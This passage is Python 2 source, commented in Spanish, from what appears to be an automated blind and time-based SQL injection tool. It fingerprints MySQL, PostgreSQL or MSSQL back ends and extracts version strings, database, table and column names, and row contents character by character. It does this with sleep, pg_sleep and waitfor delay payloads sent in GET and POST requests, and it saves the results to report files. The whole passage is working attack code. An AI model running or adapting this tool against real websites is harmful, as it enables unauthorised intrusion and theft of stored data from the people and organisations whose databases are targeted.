			consulta = requests.get(url=direccion.replace("_cond_","="+str(ord(caracter))+manejador[tipo][7].replace("#",tiempo)+obj.suf),cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
			if obj.verbosity:
				obj.showData(objeto=consulta,vulnerable=True,lll=unquote(repr(direccion.replace("_cond_","="+str(ord(caracter))+manejador[tipo][7].replace("#",tiempo)+obj.suf))))
			if consulta.elapsed.total_seconds() > float(espera):
				return caracter

				
			elif consulta.elapsed.total_seconds() < float(espera) and (up == down ):
				return "No encontrado"
			else:
				consulta2 = requests.get(url=direccion.replace("_cond_",">"+str(ord(caracter))+manejador[tipo][7].replace("#",tiempo)+obj.suf),cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
				if obj.verbosity:
					obj.showData(objeto=consulta2,vulnerable=True,lll=unquote(repr(direccion.replace("_cond_",">"+str(ord(caracter))+manejador[tipo][7].replace("#",tiempo)+obj.suf))))
				if  consulta2.elapsed.total_seconds() > float(espera):
					return Injection.busqueda(obj,manejador,tipo,ok,up,ord(caracter),fila,columna,where,obj.based)
				else:
					down2=down
					if (down2 + 1) == ord(caracter):
						return Injection.busqueda(obj,manejador,tipo,ok,ord(caracter)-1,down,fila,columna,where,obj.based)
						#print consulta.elapsed.seconds
					return Injection.busqueda(obj,manejador,tipo,ok,ord(caracter),down,fila,columna,where,obj.based)

	@staticmethod
	def getVersion(obj,manejador,tipo,ok,up,down,fila,columna,where,based):
		version = ""
		char = ""
		indiceY = 1
		indiceX = 0
		while char != "No encontrado":
		 	char =obj.busqueda(obj,manejador,"version",ok,126,32,indiceY,1,"",obj.based)
		 	#print "Caracter: "+char
		 	if char != "No encontrado":
		 		version += char
		 		indiceY = indiceY +1
		 	var = "Y"
		 	lim = 150
		 	if indiceY >= lim and (var == "Y" or var == "y") and indiceY%150 == 0:
		 		print "Intentos máximos de inyeción agotados"

		 		exit(2)
		return version
		
	@staticmethod
	def getBases(obj,manejador,tipo,ok,up,down,fila,columna,where,based):
		indiceY	= 1
		indiceX = 0
		char = "No encontrado"
		if tipo == "mssql":
			indiceX = 1
		bandera = 0
		base = ""
		bases = {}
		while char == "No encontrado" and bandera != 1:
			char = ""
			while char != "No encontrado":
				
				char =obj.busqueda(obj,manejador,"bases",ok,126,32,indiceY,indiceX,"",obj.based)
				#print "Caracter: "+char
				if char != "No encontrado":
					base += char
					indiceY = indiceY +1
			bases[base] = [""]
			print ""
			base = ""
			indiceX = indiceX + 1
			bandera = indiceY
			indiceY = 1
		return bases	
		
	@staticmethod
	def getCurrent(obj,manejador,tipo,ok,up,down,fila,columna,where,based):
		current = ""
		char = ""
		indiceY	= 1
		#print "Current:"
		while char != "No encontrado":
			char =obj.busqueda(obj,manejador,"current",ok,126,32,indiceY,1,"",obj.based)
			#print "Caracter: "+char
			if char != "No encontrado":
				current += char
				indiceY = indiceY +1
		return current
	
	@staticmethod
	def getTablas(obj,manejador,tipo,ok,up,down,fila,columna,where,based,bases,current):
		indiceY	= 1
		indiceX = 0
		char = "No encontrado"
		if tipo == "mssql":
			indiceX = 1
		bandera = 0
		tabla = ""
		if tipo == "mysql" or tipo == "mssql":
			#print bases.keys()
			for where in bases.keys():
				print "BASE: "
				obj.showCharacter(where)
				bandera = 0
				indiceY	= 1
				indiceX = 0					
				if tipo == "mysql":
					condicion = "WHERE table_schema = '"+where+"'"
				elif tipo == "mssql":
					condicion = where
					indiceX = 1
					#print "omg"
				#print "WHERE: "+ condicion+ "char: "+ char + "bandera: ",bandera
				while char == "No encontrado" and bandera != 1:
					char = ""
					#print "lol"
					while char != "No encontrado":
						
						char =obj.busqueda(obj,manejador,"tablas",ok,126,32,indiceY,indiceX,condicion,obj.based)
						#print "Caracter: "+char
						if char != "No encontrado":
							tabla += char
							indiceY = indiceY +1
					bases[where].append(tabla)
					obj.showCharacter(tabla)
					print ""
					tabla = ""
					indiceX = indiceX + 1
					bandera = indiceY
					indiceY = 1
		if tipo == "pgsql":
				where = current
				bandera = 0
				indiceY	= 1
				indiceX = 0
				condicion = ""
				#print "WHERE: "+ condicion+ "char: "+ char + "bandera: ",bandera
				while char == "No encontrado" and bandera != 1:
					char = ""
					#print "lol"
					while char != "No encontrado":
						
						char =obj.busqueda(obj,manejador,"tablas",ok,126,32,indiceY,indiceX,condicion,obj.based)
						#print "Caracter: "+char
						if char != "No encontrado":
							tabla += char
							indiceY = indiceY +1
					bases[where].append(tabla)
					print tabla
					tabla = ""
					indiceX = indiceX + 1
					bandera = indiceY
					indiceY = 1
		return bases
		
	
	@staticmethod
	def getColumnas(obj,manejador,tipo,ok,up,down,fila,columna,where,based,bases,current,version):
		#print bases
		#print bases
		indiceY	= 1
		indiceX = 0
		bandera = 0
		char = "No encontrado"
		if tipo == "mssql":
			indiceX = 1
		tabla = ""
		if not os.path.exists("report"):
			os.makedirs("report")
		

		obj.Filename = "report/datos"+str(datetime.now())+"--"+tipo
		f = open(obj.Filename+".txt",'w');
		f.write("Blind "+obj.based+" based\n")
		f.write("URL: "+obj.server)
		if (len(obj.error)>0):
			f.write("Cadena de error "+obj.error)
		if (len(obj.success)>0):
			f.write("Cadena de exito "+obj.success)
		f.write("\nBases de datos: \n")
		for where in bases.keys():
			f.write("\n"+where+"\n")
			for tablas in bases[where]:
				f.write(" "+tablas)
		if tipo == "pgsql":
			bases2 = {}
			bases2[current]=bases[current]
			bases = {}
			bases[current]=bases2[current]

		f.write("\nCurrent Database: "+current+"\n")
		f.write("Version: "+version+"\n")
		#f.write(bases)
		f.write("\n")

		for where in bases.keys():
			tablaCol=['']
			if where != "information_schema" and where != "mysql" and where != "performance_schema" and where != "msdb" and where != "master"  and where != '':
				if obj.tnames and obj.cnames and not obj.rnames:  
					print "Base de datos: "+where
				for table in bases[where]:
					if obj.tnames and obj.cnames and not obj.rnames:  
						print "\t\t"+table
					bandera = 0
					indiceY	= 1
					indiceX = 0
					columna1 = ""
					banderaCol = 0
					if tipo == "mssql":
						indiceX = 1
					columna = ""	
					#print tipo
					if tipo == "mysql":
						condicion = "WHERE table_schema = '"+where+"' and table_name = '"+table+"'"
					elif tipo == "pgsql":
						condicion = table+"'"
					elif tipo == "mssql":
						condicion = where+".INFORMATION_SCHEMA.COLUMNS  offset WHERE TABLE_NAME=N'"+table+"'"
						#print "lol de control 2 "+table+" - "+where
					#print "WHERE: "+ condicion+ "char: "+ char + "bandera: ",bandera
					while char == "No encontrado" and bandera != 1:
						char = ""
						#print "lol"
						while char != "No encontrado":
							
							char =obj.busqueda(obj,manejador,"columnas",ok,126,32,indiceY,indiceX,condicion,obj.based)
							#print "lol de control 2 "+table+" - "+where + " c " + char
							#print "Caracter: "+char
							if char != "No encontrado":
								columna += char
								indiceY = indiceY +1
						tablaCol.append(columna)
						if banderaCol == 0:
							columna1 = columna
							banderaCol = 1

						if obj.tnames and obj.cnames and not obj.rnames:  
							print "\t\t\t"+columna
							f.write("Base de datos: "+where+" Tabla: "+ table + "Columna\n")
						if where != '' and table != '' and columna != '' and ((obj.tnames and obj.cnames and obj.rnames) or (not obj.tnames and not obj.cnames and not obj.rnames)) :

							obj.getInfo(obj,manejador,tipo,ok,126,32,0,0,where,obj.based,where,current,table,columna,f,columna1)
						columna = ""
						indiceX = indiceX + 1
						bandera = indiceY
						indiceY = 1

	@staticmethod
	def getInfo(obj,manejador,tipo,ok,up,down,fila,columnas,where,based,bases,current,table,columna,f,columna1):
		print "\n\nBase: "+where+" Tabla:"+table+" columnas: "+columna
		f.write("Base: "+where+" Tabla:"+table+" columnas: "+columna+"\n");

		char2 = "No encontrado"
		bandera2 = 0
		indiceY2	= 1
		indiceX2 = 0
		if tipo == "mssql":
			indiceX2 = 1
		limite = 0
		
		if not "_sqli_" in obj.server:
			direccion = obj.server+obj.pref+" and 1=2"+obj.suf
		elif "_sqli_" in obj.server:
			direccion = obj.server.replace("_sqli_",obj.pref+" and 1=2"+obj.suf)
		count = requests.get(url=direccion,cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
		if obj.verbosity:
			obj.showData(objeto=count,vulnerable=True,lll=unquote(repr(direccion)))

		if not "_sqli_" in obj.server:
			direccion = obj.server+obj.pref+" and 1=1"+obj.suf
		elif "_sqli_" in obj.server:
			direccion = obj.server.replace("_sqli_",obj.pref+" and 1=1"+obj.suf)	
		pagCont = requests.get(url=direccion,cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
		if obj.verbosity:
			obj.showData(objeto=pagCont,vulnerable=True,lll=unquote(repr(direccion)))

		if tipo == "mysql" and obj.based == "error":

			while ((count.text != pagCont.text) ^ (len(obj.error)>0 or len(obj.success)>0)) or  (len(obj.error)>0 and obj.error in count.text) or (len(obj.success)> 0 and not obj.success in count.text):
				if not "_sqli_" in obj.server:
					direccion = obj.server+obj.pref+" and (select count(*) from "+where+"."+table+")="+str(limite)+obj.suf
				elif "_sqli_" in obj.server:
					direccion = obj.server.replace("_sqli_",obj.pref+" and (select count(*) from "+where+"."+table+")="+str(limite)+obj.suf)
				count = requests.get(url=direccion,cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
				if obj.verbosity:
					obj.showData(objeto=count,vulnerable=True,lll=unquote(repr(direccion)))

				#print obj.server.replace("_sqli_",obj.pref+" and (select count(*) from "+where+"."+table+")="+str(limite)+obj.suf)
				limite = limite +1

		elif tipo == "pgsql" and obj.based == "error":
			while ((count.text != pagCont.text) ^ (len(obj.error)>0 or len(obj.success)>0)) or  (len(obj.error)>0 and obj.error in count.text) or (len(obj.success)> 0 and not obj.success in count.text):
				if not "_sqli_" in obj.server:
					direccion = obj.server+obj.pref+"  and (select count(*) from "+table+")="+str(limite)+obj.suf
				elif "_sqli_" in obj.server:
					direccion = obj.server.replace("_sqli_",obj.pref+"  and (select count(*) from "+table+")="+str(limite)+obj.suf)
				#print direccion
				count = requests.get(url=direccion,cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
				if obj.verbosity:
					obj.showData(objeto=count,vulnerable=True,lll=unquote(repr(direccion)))
				limite = limite +1

		elif tipo == "mssql" and obj.based == "error":
			while ((count.text != pagCont.text) ^ (len(obj.error)>0 or len(obj.success)>0)) or  (len(obj.error)>0 and obj.error in count.text) or (len(obj.success)> 0 and not obj.success in count.text):
				if not "_sqli_" in obj.server:
					direccion = obj.server+obj.pref+"  and (select count(*) from "+where+".."+table+")="+str(limite)+obj.suf
				elif "_sqli_" in obj.server:
					direccion = obj.server.replace("_sqli_",obj.pref+"  and (select count(*) from "+where+".."+table+")="+str(limite)+obj.suf)
				count = requests.get(url=direccion,cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
				if obj.verbosity:
					obj.showData(objeto=count,vulnerable=True,lll=unquote(repr(direccion)))
				limite = limite +1

		elif tipo == "mysql" and obj.based == "time":
			while count.elapsed.total_seconds() < 1:
				if not "_sqli_" in obj.server:
					direccion = obj.server+obj.pref+"  and if((select count(*) from "+where+"."+table+")="+str(limite)+",sleep(1),0)=0"+obj.suf
				elif "_sqli_" in obj.server:
					direccion = obj.server.replace("_sqli_",obj.pref+"  and if((select count(*) from "+where+"."+table+")="+str(limite)+",sleep(1),0)=0"+obj.suf)
				count = requests.get(url=direccion,cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
				if obj.verbosity:
					obj.showData(objeto=count,vulnerable=True,lll=unquote(repr(direccion)))
				#print obj.server+"' and (select count(*) from "+where+"."+table+")="+str(limite)+"-- -+"
				limite = limite +1

		elif tipo == "pgsql" and obj.based == "time":
			while count.elapsed.total_seconds() < 1:
				if not "_sqli_" in obj.server:
					direccion = obj.server+obj.pref+"  select case when ((select count(*) from "+table+")="+str(limite)+") then pg_sleep(1) end"+obj.suf
				elif "_sqli_" in obj.server:
					direccion = obj.server.replace("_sqli_",obj.pref+"  select case when ((select count(*) from "+table+")="+str(limite)+") then pg_sleep(1) end"+obj.suf)
				count = requests.get(url=direccion,cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
				if obj.verbosity:
					obj.showData(objeto=count,vulnerable=True,lll=unquote(repr(direccion)))
				limite = limite +1

		elif tipo == "mssql" and obj.based == "time":
			while count.elapsed.total_seconds() < 1:
				if not "_sqli_" in obj.server:
					direccion = obj.server+obj.pref+"  if (select count(*) from "+where+".."+table+")="+str(limite)+" waitfor delay '00:00:01'"+obj.suf
				elif "_sqli_" in obj.server:
					direccion = obj.server.replace("_sqli_",obj.pref+"  if (select count(*) from "+where+".."+table+")="+str(limite)+" waitfor delay '00:00:01'"+obj.suf)
				count = requests.get(url=direccion,cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
				if obj.verbosity:
					obj.showData(objeto=count,vulnerable=True,lll=unquote(repr(direccion)))
				limite = limite +1
		limite2 = 0
		while limite2 != limite-1 and limite-1 >= 0:

			char2 = ""
			dato = ""

			while char2 != "No encontrado":
				#print "lol"
				if tipo == "mysql":
					condicion2 = columna + " from " + where + "." + table + " "
				elif tipo == "pgsql":
					condicion2 = columna + " from " + table + " "
				elif tipo == "mssql":
					condicion2 = manejador["datos"][2].replace("#",columna).replace("$",columna1)+where+".."+table
				char2 =obj.busqueda(obj,manejador,"datos",ok,126,32,indiceY2,indiceX2,condicion2,obj.based)
				#print "Caracter: "+char2
				if char2 != "No encontrado":
					dato += char2
					indiceY2 = indiceY2 +1
			f.write(dato+"\n")
			#print "TABLA: "+tabla
			dato = ""
			indiceX2 = indiceX2 + 1
			bandera2 = indiceY2
			indiceY2 = 1
			limite2 = limite2 +1
		#f.close()
	
	@staticmethod
	def getDatos(obj,manejador,ok,tipo):
		
		char = ""
		indiceY = 1
		indiceX = 0

		if obj.dnames:
			print "Bases:"
			bases = obj.getBases(obj,manejador,tipo,ok,126,32,indiceY,indiceX,"",obj.based)
			exit(0)
		elif obj.tnames and not obj.cnames and not obj.rnames: 

			#print "Tablas:"
			basesT={}
			#print obj.listaBases
			for base in obj.listaBases:
				basesT[base]=['']
			#print basesT
			current = obj.getCurrent(obj,manejador,"current",ok,126,32,indiceY,1,"",obj.based)
			basesT = obj.getTablas(obj,manejador,tipo,ok,126,32,indiceY,indiceX,"",obj.based,basesT,current)
			#print basesT
			exit(0)
		elif obj.tnames and obj.cnames and not obj.rnames:  
			basesT={}
			#print obj.listaBases
			for base in obj.listaBases:
				basesT[base]=['']
				for column in obj.listaTablas:
					basesT[base].append(column)
			#print basesT
			current = obj.getCurrent(obj,manejador,"current",ok,126,32,indiceY,1,"",obj.based)
			obj.getColumnas(obj,manejador,tipo,ok,126,32,indiceY,indiceX,"",obj.based,basesT,current,"")
			exit(0)
		elif obj.tnames and obj.cnames and obj.rnames:
			basesT={}
			
			current = obj.getCurrent(obj,manejador,"current",ok,126,32,indiceY,1,"",obj.based)
			
			if not os.path.exists("report"):
				os.makedirs("report")
			

			obj.Filename = "report/datos"+str(datetime.now())+"--"+tipo
			f = open(obj.Filename+".txt",'w');
			f.write("Blind "+obj.based+" based\n")
			f.write("URL: "+obj.server)
			if (len(obj.error)>0):
				f.write("Cadena de error "+obj.error)
			if (len(obj.success)>0):
				f.write("Cadena de exito "+obj.success)
			f.write("\nBases de datos: \n")
			
			if tipo == "pgsql":
				print "Postgres solo puede buscar en la BD actual!"
				for tabla in obj.listaTablas:
					for columna in obj.columnasElegidas:
						obj.getInfo(obj,manejador,tipo,ok,126,32,0,0,current,obj.based,current,current,tabla,columna,f,"")

			else:
				# print "lol"
				# print obj.listaBases
				# print obj.listaTablas
				# print obj.columnasElegidas

			#print obj.listaBases
			
				for base in obj.listaBases:
					for tabla in obj.listaTablas:
						for columna in obj.columnasElegidas:
							print base+tabla+columna
							obj.getInfo(obj,manejador,tipo,ok,126,32,0,0,base,obj.based,base,current,tabla,columna,f,obj.columnasElegidas[0])
			exit(0)
				
			

			

###=========Version============= 
		version = ""
		version = obj.getVersion(obj,manejador,"version",ok,126,32,indiceY,1,"",obj.based)
		print "Version: "+version
###=========Bases===============
		print "Bases:"
		bases = obj.getBases(obj,manejador,tipo,ok,126,32,indiceY,indiceX,"",obj.based)
		#print bases
		#print "lol2"
###=========Current============= 
		
		current = ""
		current = obj.getCurrent(obj,manejador,"current",ok,126,32,indiceY,1,"",obj.based)
		print "Current:",current
# ##==========Tablas============
		print "Tablas:"+tipo
		bases2 = obj.getTablas(obj,manejador,tipo,ok,126,32,indiceY,indiceX,"",obj.based,bases,current)
		
		#f.close()
		#print bases[:len(bases)-1]
		

####============Datos============
		print "Datos:"
		obj.getColumnas(obj,manejador,tipo,ok,126,32,indiceY,indiceX,"",obj.based,bases2,current,version)



##======================== Resultados
		print "Reporte: "+obj.Filename
		print "\nCurrent Database: "+current
		print "Version: "+version
		#print bases[:len(bases)-1]
		print bases

		
		
			
	@staticmethod
	def getMid(up,down):
		return int(((up-down)/2) + down)

	@staticmethod
	def getCatalog(obj,version):
		if version == "mysql" and obj.based == "error":
			return obj.catalogoMySQL
		elif version == "pgsql" and obj.based == "error":
			return obj.catalogoPostgres
		elif version == "mssql" and obj.based == "error":
			return obj.catalogoMSSQL
		elif version == "oracle" and obj.based == "error":
			return obj.catalogoOracle
		elif version == "mysql" and obj.based == "time":
			return obj.catalogoMySQLBlind
		elif version == "pgsql" and obj.based == "time":
			return obj.catalogoPostgresBlind
		elif version == "mssql" and obj.based == "time":
			return obj.catalogoMSSQLBlind
		elif version == "oracle" and obj.based == "time":
			return obj.catalogoOracleBlind

	def showCharacter(self,Character=""):
		#pass
		stdout.write("\033[1;36m"+Character+"\033[0m")
		stdout.flush()


	def PostInjection(self):
		#First try MySQL queries
		if self.Which.__len__()<1:
			self.bases = ('Postgres','Mssql','MySQL')#,'Oracle')
		else:
			self.bases = self.Which.split()
		Ftime = True
		ans = False
		self.dataTempo = self.datos.copy()
		for dbms in self.bases:
			print "="*25,"",dbms," Begin ","="*25
			for pref in self.Prefijos:
				for payl in self.PayloadsAttempt.get(dbms):
					for suf in self.Sufijos.get(dbms):
						#print self.datos
						self.dataTempo = self.datos.copy()
						#query is a dictionary which contains the payloads append to original data
						if len(self.error) > 0:
							payl = payl.replace("and","or",1)
							payl = payl.replace("&&","||",1)
						query = self.ChangePhrase(DataPost=self.dataTempo,FirsTime=Ftime,pload="{0}{1}{2}".format(pref,payl.replace(self.dormir,str(self.time)),suf))
						#sleep(0.09)
						#Attempt make a request to server with the sqli payload
						#print query
						Attempt = requests.post(url=self.server,cookies=self.cookies,headers=self.cabeceras,data=query,proxies=self.proxy)
						Ftime=False
						if self.verbosity:
							self.showData(objeto=Attempt,Previo=False,vulnerable=True,lll=unquote(repr(Attempt.request.body)))
						# Imprimir Respuesta
						if self.based == "time":
							#cumple = (Attempt.content == self.GoodRequest.content) and self.GoodRequest.elapsed.total_seconds() < (Attempt.elapsed.total_seconds() + float(self.Time) )
							if (len(self.success) == 0 ) and (len(self.error) == 0):
								# Compare Baseline response against Attempt response
								cumple = (Attempt.content == self.GoodRequest.content) and ((self.GoodRequest.elapsed.total_seconds() < Attempt.elapsed.total_seconds()) and (Attempt.elapsed.total_seconds() > float(self.time)))
							if len(self.success) > 0:
								# Compare if Success string is contained inside Baseline Response 
								cumple = (self.success in self.GoodRequest.content) and (self.GoodRequest.elapsed.total_seconds() < Attempt.elapsed.total_seconds()) and (Attempt.elapsed.total_seconds() > float(self.time))
							if len(self.error) > 0:
								# Compare if Error string not appear inside Baseline Response
								cumple = (self.error not in Attempt.content) and (self.GoodRequest.elapsed.total_seconds() < Attempt.elapsed.total_seconds()) and (Attempt.elapsed.total_seconds() > float(self.time))
						else:
							if (len(self.success) == 0 ) and (len(self.error) == 0):
								cumple = Attempt.content == self.GoodRequest.content
							if len(self.success) > 0:
								cumple = self.success in Attempt.content
							if len(self.error) > 0:
								cumple = self.error not in Attempt.content
						if cumple:
							#After do a post request, prefix, payload and suffix will be storage in "Flags" variable
							self.Flags[dbms]['Prefijo'].append(pref)
							self.Flags[dbms]['Payload'].append(payl.replace(self.dormir,str(self.time)))
							self.Flags[dbms]['Sufijo'].append(suf)
							return
						else:
							if "syntax" in Attempt.content:
								#print Attempt.content
								if not ans:
									print "\t\t\t\033[1;33m Page vulnerable to SQLi, sorry but this tool only works with Blind and Time sqli Based\033[0m"
									try:
										ans = self.Continue(raw_input("\033[1;34m Do you want continue [y/N] \033[0m").lower()[0])
									except:
										ans = self.Continue("")
									if ans:
										pass
									else:
										print "Bye"
										exit(1)
							pass
	#####################################	Printing Unsuccesfull queries ##########################################
			print "="*25,dbms," End ","="*25

# Question to user if he want to continue with attack
	def Continue(self,answer=""):
		try:
			if answer not in ('y','n'):
				answer = raw_input("\033[1;34m Do you want continue [y/N] \033[0m").lower()[0]
				self.Continue(answer)
			if answer == 'y':
				return True
			else:
				return False
		except:
			exit(1)

	# Cleaning duplicate values from Flags
	def rmDupValue(self):
		for dbms in self.bases:
			for field in ('Prefijo','Payload','Sufijo'):
				self.Flags[dbms][field] = list(set(self.Flags[dbms][field]))
	#####################################	Printing DBMS values ##########################################
	#Function used to determine DBMS
	def Whatis(self):
		tmp = 0
		for dbms in self.bases:
			tt = len(self.Flags[dbms]['Payload'])
			if  tt > tmp:
				tmp = tt
				self.Which = dbms
			elif tt == tmp:
				self.Which = "Unknown"

		if self.Which.__len__==0:
			print "Not vulnerable"
		else:
			print "DBMS detected \033[1;36m"+self.Which+"\033[0m"
			#print self.Flags
			for i in xrange(1):
				#print "\033[6;1;32mGREEN TEXT\033[0m"
				# Adding colors to Text
				try:
					ooo = "".join(("\033[1;36m"+"{0}={1}&").format(key, value) for key, value in self.datos.items())[:-1]
					self.prefixSuccess = choice(self.Flags[self.Which]['Prefijo'])
					self.suffixSuccess = choice(self.Flags[self.Which]['Sufijo'])
					#uuu = "\033[1;33m{0}\033[0m\033[5;32m{1}\033[0m\033[1;33m{2}\033[0m".format(choice(self.Flags[self.Which]['Prefijo']),choice(self.Flags[self.Which]['Payload']),choice(self.Flags[self.Which]['Sufijo']))
					uuu = "\033[1;33m{0}\033[0m\033[5;32m{1}\033[0m\033[1;33m{2}\033[0m".format(self.prefixSuccess,choice(self.Flags[self.Which]['Payload']),self.suffixSuccess)
					ooo = ooo.replace(self.Comodin,uuu)
					self.showData(ooo,vulnerable=True,objeto=self.GoodRequest)
				except:
					self.showData("No vulnerable try another dbms",vulnerable=False)

	def showData(self,lll="",Previo=False,vulnerable=False,objeto=""):
		if Previo:
			try:
				previous = open(self.fullPath+"/"+self.succesfullQuery,"r").read()
				print "DBMS",previous.split(':::')[2],"\n"
				print "-"*56
				print ":"*20,"Data Requested",":"*20
				print "-"*56
				print "\033[1;35m{0} {1} HTTP/1.1\033[0m \n".format(previous.split(':::')[1],previous.split(':::')[0])
				print previous.split(':::')[5],"\033[0m\n"
			except:
				print "not vulnerable"
		else:
			if vulnerable:
				print "-"*140
				print ":"*60,"Client Request",":"*60l
				print "-"*140
				#print "\033[1;35m{0} {1} HTTP/1.1\033[0m \n".format(self.GoodRequest.request.method,self.GoodRequest.request.path_url)
				# Cambiar objeto por self.GoodRequest
				print "\033[1;35m{0} {1} HTTP/1.1\033[0m \n".format(objeto.request.method,objeto.request.path_url)
				for h in objeto.request.headers: print "\033[1;35m"+h,":",objeto.request.headers.get(h)+"\033[0m"
				print "\n\033[1;36m",lll,"\033[0m\n\033[0m"
				print "-"*140
				print ":"*60,"Server Response",":"*60
				print "-"*140
				try:
					for i in objeto.headers: print "\033[1;35m"+i,":",objeto.headers.get(i)+"\033[0m"
				except:
					pass
				####
				## This section will write successfull data to file
				if vulnerable:# and Previo:
					if not Previo:
						try:
							sss = open(self.fullPath+"/"+self.succesfullQuery,"w")
																				#################################################
																				# 	Format to use when write in a file as csv 	#
																				#   url, method, dbms, prefix, sufix, request   #
																				#################################################
							sss.write("{0}:::{1}:::{2}:::{3}:::{4}:::{5}".format(self.GoodRequest.url.__str__(), self.GoodRequest.request.method, self.Which, self.prefixSuccess,self.suffixSuccess,lll))
							sss.close()
						except:
							print ""
							#print "Failed to write data in file"
				elif not vulnerable:
					print "Bye"
					exit(1)
			elif not vulnerable:
				print "Bye"
				exit(1)


	#Function used to replace value of variable Comodin (passphrase) with queries to detect a sqli
	def ChangePhrase(self,DataPost="",pload="",FirsTime=False,cAscii=0,offset=0,pos=0,dname=False,cant=False,longi=False,cname=False,tname=False,nombreBase="",nombreTabla="",reina="",records=False):
####################################################################################################################################################
		if FirsTime:
			#print "Primera vez ;)"
			lol = self.datos.copy()
			for param in lol.keys():
				if self.Comodin in lol.get(param):
					lol[param] = lol.get(param).replace(self.Comodin,"")
			self.GoodRequest = requests.post(url=self.server,cookies=self.cookies,headers=self.cabeceras,data=lol,proxies=self.proxy)
			#print "Original Request",lol
			#sleep(0.2)
####################################################################################################################################################			
		# Solo sustituye el valor para la cantidad de registros
		if cant:
		 	for parametro in DataPost.keys():
		 		if self.Comodin in DataPost.get(parametro):
		 			DataPost[parametro] = DataPost.get(parametro).replace(self.Comodin,pload).format(cAscii)
		 	return DataPost
####################################################################################################################################################
		# Solo sustituye la longitud de un registro
		if longi:
			if tname: # Longitud de la cadena concatenada de las tablas
				for parametro in DataPost.keys():
					if self.Comodin in DataPost.get(parametro):
						DataPost[parametro] = DataPost.get(parametro).replace(self.Comodin,pload).format(nombreBase,cAscii)
				return DataPost
			if cname:
				for parametro in DataPost.keys():
					if self.Comodin in DataPost.get(parametro):
						DataPost[parametro] = DataPost.get(parametro).replace(self.Comodin,pload).format(nombreBase,nombreTabla,cAscii)
				return DataPost
			#Cambiar el offset y el código ascii para
			if records:
				for parametro in DataPost.keys():
					if self.Comodin in DataPost.get(parametro):
						DataPost[parametro] = DataPost.get(parametro).replace(self.Comodin,pload).format(offset,cAscii)
				return DataPost
			else:
				for parametro in DataPost.keys():
					if self.Comodin in DataPost.get(parametro):
						DataPost[parametro] = DataPost.get(parametro).replace(self.Comodin,pload).format(cAscii)
				return DataPost

####################################################################################################################################################
		# Sustituye el valor para de cada registros, la posición que va recorriendo de la cadena y su código ascii
		if dname:
			for parametro in DataPost.keys():
				if self.Comodin in DataPost.get(parametro):
					DataPost[parametro] = DataPost.get(parametro).replace(self.Comodin,pload).format(pos,cAscii)
			#print "ñ.ñ",DataPost
			return DataPost
		#Sustituyendo para extraer el nombre de la base de datos
		if tname:
			for parametro in DataPost.keys():
				if self.Comodin in DataPost.get(parametro):
					DataPost[parametro] = DataPost.get(parametro).replace(self.Comodin,pload).format(nombreBase,pos,cAscii)
			return DataPost
		if cname:
			if reina == 'Postgres':
				for parametro in DataPost.keys():
					if self.Comodin in DataPost.get(parametro):
						DataPost[parametro] = DataPost.get(parametro).replace(self.Comodin,pload).format(cAscii)
				return DataPost
			for parametro in DataPost.keys():
				if self.Comodin in DataPost.get(parametro):
					DataPost[parametro] = DataPost.get(parametro).replace(self.Comodin,pload).format(nombreBase,nombreTabla,pos,cAscii)
			return DataPost
		if records:
			#print "QUERY =>",pload
			for parametro in DataPost.keys():
				if self.Comodin in DataPost.get(parametro):
					DataPost[parametro] = DataPost.get(parametro).replace(self.Comodin,pload).format(pos,cAscii)
			#print "ñ.ñ",DataPost
			return DataPost

		else:
			for parametro in DataPost.keys():
				if self.Comodin in DataPost.get(parametro):
					DataPost[parametro] = DataPost.get(parametro).replace(self.Comodin,pload)
			return DataPost

								#######################################
								## Hard methods to get database name ##
								##			  using 'and'			 ##
								#######################################

	def getDelimiters(self):
		try:
			#First we extract prefix and suffix storage in a text file used on previous information gathering
			fSuccess = open(self.fullPath+"/"+self.succesfullQuery,"r").read()
			self.Which = fSuccess.split(':::')[2]
			self.newPrefix = fSuccess.split(':::')[3]
			self.newSuffix = fSuccess.split(':::')[4]
		except:
			print "Target not vulnerable"
			exit(1)

										#####################
										## Guessing limits ##
										#####################

	def CantidadRegistros(self,ppload="",tb="",contador=0):
		liminf = 0
		limsup = 40
		medio = (liminf + limsup)//2
		found = False
		while True:
			self.dataTempo = self.datos.copy()
			if len(self.error) > 0:
				ppload = ppload.replace("and","or",1)
				ppload = ppload.replace("&&","||",1)
			query = self.ChangePhrase(FirsTime=True,DataPost=self.dataTempo,pload="{0}{1}{2}".format(self.newPrefix,ppload.replace(self.dormir,str(self.time)),self.newSuffix),cant=True,cAscii=medio)
			Attempt = requests.post(url=self.server,cookies=self.cookies,headers=self.cabeceras,data=query,proxies=self.proxy)
			#print query
			#sleep(0.5)
			if self.based == "time":
				#cumple = (Attempt.content == self.GoodRequest.content) and self.GoodRequest.elapsed.total_seconds() < (Attempt.elapsed.total_seconds() + float(self.Time) )
				if (len(self.success) == 0 ) and (len(self.error) == 0):
					# Compare Baseline response against Attempt response
					cumple = (Attempt.content == self.GoodRequest.content) and ((self.GoodRequest.elapsed.total_seconds() < Attempt.elapsed.total_seconds()) and (Attempt.elapsed.total_seconds() > float(self.time)))
				if len(self.success) > 0:
					# Compare if Success string is contained inside Baseline Response 
					cumple = (self.success in self.GoodRequest.content) and (self.GoodRequest.elapsed.total_seconds() < Attempt.elapsed.total_seconds()) and (Attempt.elapsed.total_seconds() > float(self.time))
				if len(self.error) > 0:
					# Compare if Error string not appear inside Baseline Response
					cumple = (self.error not in Attempt.content) and (self.GoodRequest.elapsed.total_seconds() < Attempt.elapsed.total_seconds()) and (Attempt.elapsed.total_seconds() > float(self.time))
			else:
				if (len(self.success) == 0 ) and (len(self.error) == 0):
					cumple = Attempt.content == self.GoodRequest.content
				if len(self.success) > 0:
					cumple = self.success in Attempt.content
				if len(self.error) > 0:
					cumple = self.error not in Attempt.content
			if found:
				break
			#if Attempt.content == self.GoodRequest.content:
			if cumple:
				#print "Menor"
				liminf = liminf
				limsup = medio
				medio = (liminf + limsup)//2
			#elif not(Attempt.content == self.GoodRequest.content):
			elif not cumple:
